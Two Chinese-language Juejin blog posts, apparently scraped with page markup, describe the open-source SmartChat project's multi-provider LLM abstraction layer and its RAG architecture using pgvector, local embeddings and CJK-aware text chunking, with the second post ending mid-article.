                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>做 AI 应用最怕什么？供应商锁定。今天 OpenAI 涨价，明天某个国产模型效果更好，后天客户要求用私有化部署的模型……如果代码和某个 LLM 提供商深度耦合，每次切换都是一次重构。</p>
<p>SmartChat 通过一个 Provider 抽象层，实现了 7+ 个 LLM 提供商的无缝切换。来看看它是怎么设计的。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a046cdc202874e49b3cbaff7691166a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521604&amp;x-signature=4r%2FFuGWUK0PTxlfXi6pEB4AD7lQ%3D" alt="微信图片_20260212194717_45_236.png" loading="lazy"/></p>
<h2 data-id="heading-1">一、问题：LLM 提供商的碎片化</h2>
<p>目前主流的 LLM 提供商各有各的 SDK 和 API 格式：</p>
<ul>
<li><strong>OpenAI</strong>：<code>openai</code> SDK，<code>/v1/chat/completions</code></li>
<li><strong>Anthropic</strong>：<code>@anthropic-ai/sdk</code>，<code>/v1/messages</code>，完全不同的消息格式</li>
<li><strong>国产模型</strong>：大多兼容 OpenAI 格式，但 base URL 和模型名不同</li>
</ul>
<p>如果每个提供商写一套调用逻辑，代码会变成这样：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 反面教材：硬编码每个提供商</span>
<span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'openai'</span>) {
  <span class="hljs-comment">// OpenAI 的调用逻辑</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'anthropic'</span>) {
  <span class="hljs-comment">// Anthropic 的调用逻辑</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'deepseek'</span>) {
  <span class="hljs-comment">// DeepSeek 的调用逻辑</span>
} <span class="hljs-comment">// ... 无限 if-else</span>
</code></pre>
<h2 data-id="heading-2">二、SmartChat 的 Provider 抽象层</h2>
<p>SmartChat 的核心思路是：<strong>将所有提供商归为两类 SDK（OpenAI 和 Anthropic），通过预设配置 + 统一接口消除差异</strong>。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Provider 预设配置</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PROVIDER_PRESETS</span> = {
  <span class="hljs-attr">openai</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.openai.com/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'gpt-4o'</span>, <span class="hljs-string">'gpt-4o-mini'</span>, <span class="hljs-string">'gpt-3.5-turbo'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>
  },
  <span class="hljs-attr">deepseek</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.deepseek.com/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'deepseek-chat'</span>, <span class="hljs-string">'deepseek-reasoner'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// DeepSeek 兼容 OpenAI 格式</span>
  },
  <span class="hljs-attr">qwen</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'qwen-turbo'</span>, <span class="hljs-string">'qwen-plus'</span>, <span class="hljs-string">'qwen-max'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// 通义千问也兼容 OpenAI 格式</span>
  },
  <span class="hljs-attr">anthropic</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.anthropic.com'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'claude-3-5-sonnet'</span>, <span class="hljs-string">'claude-3-haiku'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'anthropic'</span>
  },
  <span class="hljs-attr">custom</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">''</span>, <span class="hljs-comment">// 用户自定义</span>
    <span class="hljs-attr">models</span>: [],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// 默认走 OpenAI 兼容协议</span>
  }
};
</code></pre>
<p>关键洞察：<strong>绝大多数国产模型都兼容 OpenAI API 格式</strong>，所以只需要维护两套 SDK 调用逻辑（OpenAI 和 Anthropic），通过切换 <code>baseURL</code> 就能接入不同提供商。</p>
<h2 data-id="heading-3">三、统一的流式输出接口</h2>
<p>不同 SDK 的流式输出格式差异很大，SmartChat 将其统一为一个 <code>streamChat</code> 函数：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">streamChat</span>(<span class="hljs-params">params: {
  provider: <span class="hljs-built_in">string</span>;
  model: <span class="hljs-built_in">string</span>;
  messages: Message[];
  apiKey: <span class="hljs-built_in">string</span>;
  temperature?: <span class="hljs-built_in">number</span>;
}</span>) {
  <span class="hljs-keyword">const</span> preset = <span class="hljs-variable constant_">PROVIDER_PRESETS</span>[params.<span class="hljs-property">provider</span>];

  <span class="hljs-keyword">if</span> (preset.<span class="hljs-property">sdk</span> === <span class="hljs-string">'openai'</span>) {
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
      <span class="hljs-attr">apiKey</span>: params.<span class="hljs-property">apiKey</span>,
      <span class="hljs-attr">baseURL</span>: preset.<span class="hljs-property">baseURL</span>
    });

    <span class="hljs-keyword">return</span> client.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: params.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: params.<span class="hljs-property">messages</span>,
      <span class="hljs-attr">temperature</span>: params.<span class="hljs-property">temperature</span>,
      <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>
    });
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (preset.<span class="hljs-property">sdk</span> === <span class="hljs-string">'anthropic'</span>) {
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Anthropic</span>({ <span class="hljs-attr">apiKey</span>: params.<span class="hljs-property">apiKey</span> });

    <span class="hljs-keyword">return</span> client.<span class="hljs-property">messages</span>.<span class="hljs-title function_">stream</span>({
      <span class="hljs-attr">model</span>: params.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: <span class="hljs-title function_">convertToAnthropicFormat</span>(params.<span class="hljs-property">messages</span>),
      <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">4096</span>,
      <span class="hljs-attr">temperature</span>: params.<span class="hljs-property">temperature</span>
    });
  }
}
</code></pre>
<p>上层业务代码只需要调用 <code>streamChat()</code>，完全不关心底层用的是哪个提供商。</p>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20../docs/images/screenshot-04-bot-settings.png" alt="SmartChat 机器人设置转存失败，建议直接上传图片文件" loading="lazy"/></p>
<h2 data-id="heading-4">四、自定义端点：终极灵活性</h2>
<p>SmartChat 还支持用户配置自定义的 OpenAI 兼容端点，这意味着可以接入：</p>
<ul>
<li><strong>本地部署的模型</strong>：Ollama、vLLM、LocalAI</li>
<li><strong>企业私有化部署</strong>：Azure OpenAI、AWS Bedrock（通过兼容层）</li>
<li><strong>任何 OpenAI 兼容的 API</strong>：各种代理、中转服务</li>
</ul>
<p>用户只需在设置页面填入 base URL、API Key 和模型名称即可。</p>
<h2 data-id="heading-5">五、成本优化策略</h2>
<p>多模型架构带来的一个隐藏好处是<strong>成本优化</strong>：</p>
<pre><code class="hljs">简单问题 → 使用便宜的模型（DeepSeek、Qwen-Turbo）
复杂问题 → 使用强力模型（GPT-4o、Claude Sonnet）
嵌入向量 → 使用本地模型（零成本）
</code></pre>
<p>每个机器人可以独立配置模型和参数，运营者可以根据业务场景灵活调整。</p>
<h2 data-id="heading-6">六、这个设计模式的可复用性</h2>
<p>SmartChat 的 Provider 抽象层设计模式可以直接复用到其他 AI 应用中。核心思路总结：</p>
<ol>
<li><strong>识别 SDK 家族</strong>：大多数提供商属于 OpenAI 兼容或 Anthropic 两个家族</li>
<li><strong>预设配置驱动</strong>：用配置而非代码来区分提供商</li>
<li><strong>统一接口</strong>：上层业务只依赖抽象接口</li>
<li><strong>自定义端点兜底</strong>：覆盖所有长尾场景</li>
</ol>
<h2 data-id="heading-7">总结</h2>
<p>LLM 领域变化太快，今天的最优选择明天可能就不是了。SmartChat 的多模型架构不是过度设计，而是对现实的务实应对。如果你也在做 AI 应用，强烈建议从第一天就做好 Provider 抽象。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong>，MIT 开源协议。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服]]></title>    <link>https://juejin.cn/post/7605848213602861102</link>    <guid>https://juejin.cn/post/7605848213602861102</guid>    <pubDate>2026-02-12T17:14:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602861102" data-draft-id="7605769126271434798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服"/> <meta itemprop="keywords" content="Agent,前端"/> <meta itemprop="datePublished" content="2026-02-12T17:14:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梦里寻码"/> <meta itemprop="url" content="https://juejin.cn/user/528241507974520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/528241507974520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梦里寻码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:14:45.000Z" title="Thu Feb 12 2026 17:14:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 LLM 应用落地的过程中，RAG（Retrieval-Augmented Generation）已经成为最主流的知识增强方案。但真正把 RAG 做好并不容易——嵌入模型怎么选？向量数据库用哪个？文档怎么切分？中文场景有哪些坑？</p>
<p>今天通过开源项目 SmartChat 的源码，深入拆解一套生产级 RAG 架构的设计思路。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adb37d4883ab40f88cd31a69960fadfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521624&amp;x-signature=LzHmPRFdhHy7YhOubjJ2aQR3EbM%3D" alt="微信图片_20260212194717_45_236.png" loading="lazy"/></p>
<h2 data-id="heading-1">一、RAG 的核心流程</h2>
<p>RAG 的本质是"先检索，再生成"：</p>
<pre><code class="hljs">用户提问 → Embedding 向量化 → 向量数据库检索 → 取回相关文档片段 → 拼接 Prompt → LLM 生成回答
</code></pre>
<p>SmartChat 的实现完整覆盖了这条链路，并在每个环节做了工程化优化。</p>
<h2 data-id="heading-2">二、双嵌入策略：本地 vs 远程</h2>
<p>SmartChat 最有意思的设计之一是<strong>双嵌入策略</strong>：</p>
<p><strong>本地嵌入（默认）：</strong></p>
<ul>
<li>使用 HuggingFace Transformers 在浏览器/Node 端运行</li>
<li>支持 <code>BGE-small-zh-v1.5</code>（中文场景）和 <code>all-MiniLM-L6-v2</code>（英文场景）</li>
<li>零成本，无需 API Key，数据不出本地</li>
</ul>
<p><strong>远程嵌入（备选）：</strong></p>
<ul>
<li>使用通义千问 <code>text-embedding-v3</code>，512 维向量</li>
<li>适合部署在 Vercel 等无法运行本地模型的环境</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 嵌入模型选择逻辑</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateEmbedding</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span>, model: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">if</span> (model === <span class="hljs-string">'local-bge'</span> || model === <span class="hljs-string">'local-minilm'</span>) {
    <span class="hljs-comment">// HuggingFace Transformers 本地推理</span>
    <span class="hljs-keyword">const</span> pipe = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipeline</span>(<span class="hljs-string">'feature-extraction'</span>, modelName);
    <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipe</span>(text, { <span class="hljs-attr">pooling</span>: <span class="hljs-string">'mean'</span>, <span class="hljs-attr">normalize</span>: <span class="hljs-literal">true</span> });
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(output.<span class="hljs-property">data</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 远程 API 调用</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">embeddings</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">'text-embedding-v3'</span>,
      <span class="hljs-attr">input</span>: text,
      <span class="hljs-attr">dimensions</span>: <span class="hljs-number">512</span>
    });
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">embedding</span>;
  }
}
</code></pre>
<p>这种设计的好处是：开发阶段用本地模型零成本调试，生产环境可以按需切换到远程模型。</p>
<h2 data-id="heading-3">三、pgvector：为什么不用 Pinecone 或 Milvus？</h2>
<p>SmartChat 选择 Supabase + pgvector 作为向量存储，而不是专用向量数据库，原因很务实：</p>









































<table><thead><tr><th>维度</th><th>pgvector</th><th>Pinecone</th><th>Milvus</th></tr></thead><tbody><tr><td>部署复杂度</td><td>零（Supabase 自带）</td><td>需要额外服务</td><td>需要独立部署</td></tr><tr><td>成本</td><td>Supabase 免费额度内</td><td>按量付费</td><td>自建服务器</td></tr><tr><td>关系查询</td><td>原生 SQL JOIN</td><td>不支持</td><td>不支持</td></tr><tr><td>适用规模</td><td>中小规模（&lt;100万向量）</td><td>大规模</td><td>大规模</td></tr><tr><td>生态整合</td><td>与业务数据同库</td><td>独立系统</td><td>独立系统</td></tr></tbody></table>
<p>对于智能客服场景，知识库通常在几千到几万条文档片段，pgvector 完全够用，而且最大的优势是<strong>向量数据和业务数据在同一个数据库里</strong>，不需要维护额外的基础设施。</p>
<p>SmartChat 使用的向量检索函数：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> match_documents(
  query_embedding vector(<span class="hljs-number">512</span>),
  match_count <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
  filter_bot_id uuid <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>
) <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">TABLE</span> (
  id uuid,
  content text,
  metadata jsonb,
  similarity <span class="hljs-type">float</span>
)
<span class="hljs-keyword">LANGUAGE</span> plpgsql <span class="hljs-keyword">AS</span> $$
<span class="hljs-keyword">BEGIN</span>
  <span class="hljs-keyword">RETURN</span> QUERY
  <span class="hljs-keyword">SELECT</span>
    dc.id,
    dc.content,
    dc.metadata,
    <span class="hljs-number">1</span> <span class="hljs-operator">-</span> (dc.embedding <span class="hljs-operator">&lt;=&gt;</span> query_embedding) <span class="hljs-keyword">as</span> similarity
  <span class="hljs-keyword">FROM</span> document_chunks dc
  <span class="hljs-keyword">WHERE</span> dc.bot_id <span class="hljs-operator">=</span> filter_bot_id
  <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> dc.embedding <span class="hljs-operator">&lt;=&gt;</span> query_embedding
  LIMIT match_count;
<span class="hljs-keyword">END</span>;
$$;
</code></pre>
<p>使用余弦距离 <code>&lt;=&gt;</code> 操作符，配合 IVFFlat 索引加速检索。</p>
<h2 data-id="heading-4">四、CJK 智能分块策略</h2>
<p>文档分块是 RAG 中最容易被忽视但影响巨大的环节。SmartChat 针对中日韩文本做了专门优化：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">splitTextIntoChunks</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span>, chunkSize = <span class="hljs-number">500</span>, overlap = <span class="hljs-number">50</span></span>) {
  <span class="hljs-comment">// 检测是否包含 CJK 字符</span>
  <span class="hljs-keyword">const</span> isCJK = <span class="hljs-regexp">/[\u4e00-\u9fff\u3040-\u309f\u30a0-\u30ff]/</span>.<span class="hljs-title function_">test</span>(text);

  <span class="hljs-keyword">if</span> (isCJK) {
    <span class="hljs-comment">// 中文按字符数分块，优先在句号、问号、感叹号处断开</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">splitBySentenceBoundary</span>(text, chunkSize, overlap);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 英文按 token 数分块，优先在段落和句子边界断开</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">splitByTokenBoundary</span>(text, chunkSize, overlap);
  }
}
</code></pre>
<p>关键设计点：</p>
<ul>
<li><strong>CJK 检测</strong>：自动识别文本语言，选择不同的分块策略</li>
<li><strong>句子边界优先</strong>：避免在句子中间截断，保持语义完整性</li>
<li><strong>重叠窗口</strong>：相邻块之间有 50 字符重叠，防止关键信息被切断</li>
<li><strong>批量插入</strong>：每 10 个块一批写入数据库，避免 payload 过大</li>
</ul>
<h2 data-id="heading-5">五、检索与生成的衔接</h2>
<p>检索到相关文档片段后，SmartChat 将其拼接到 Prompt 中：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> systemPrompt = <span class="hljs-string">`<span class="hljs-subst">${bot.systemPrompt}</span>

以下是从知识库中检索到的相关信息，请基于这些信息回答用户问题：

<span class="hljs-subst">${relevantChunks.map(chunk =&gt; chunk.content).join(<span class="hljs-string">'\n\n'</span>)}</span>

如果以上信息不足以回答问题，请如实告知用户。`</span>;
</code></pre>
<p>同时，对话上下文管理取最近 10 条消息，在保持连贯性和控制 token 消耗之间取得平衡。</p>
